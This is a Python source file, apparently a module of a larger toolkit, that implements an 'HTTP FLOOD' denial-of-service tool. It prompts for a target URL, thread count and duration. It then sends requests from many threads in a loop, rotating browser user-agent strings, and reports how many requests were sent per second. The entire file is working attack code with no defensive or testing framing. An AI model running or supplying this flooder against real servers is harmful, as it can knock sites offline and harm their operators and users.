import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from swarm_core import c, C, banner, ask, pause

import random
import threading
import time
import urllib.request

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]


def run():
    banner("HTTP FLOOD")
    url = ask("target url", "http://example.com/") or "http://example.com/"
    if not url.startswith("http"):
        url = "http://" + url
    threads = int(ask("threads", "100") or 100)
    secs = float(ask("duration (s)", "10") or 10)

    counter = {"ok": 0, "fail": 0}
    stop = threading.Event()
    lock = threading.Lock()

    def worker():
        while not stop.is_set():
            req = urllib.request.Request(url, headers={"User-Agent": random.choice(UAS)})
            try:
                urllib.request.urlopen(req, timeout=5)
                with lock:
                    counter["ok"] += 1
            except Exception:
                with lock:
                    counter["fail"] += 1

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    print(c(f"  flooding {url}  ·  {threads} threads  ·  {secs}s", C.CY))
    for t in ts:
        t.start()
    time.sleep(secs)
    stop.set()
    for t in ts:
        t.join(timeout=2)

    total = counter["ok"] + counter["fail"]
    rate = total / secs if secs else 0
    print(c(f"  {total} requests in {secs}s (~{rate:.0f}/s)  ·  "
            f"{counter['ok']} ok  {counter['fail']} fail", C.G))
    pause()


if __name__ == "__main__":
    run()
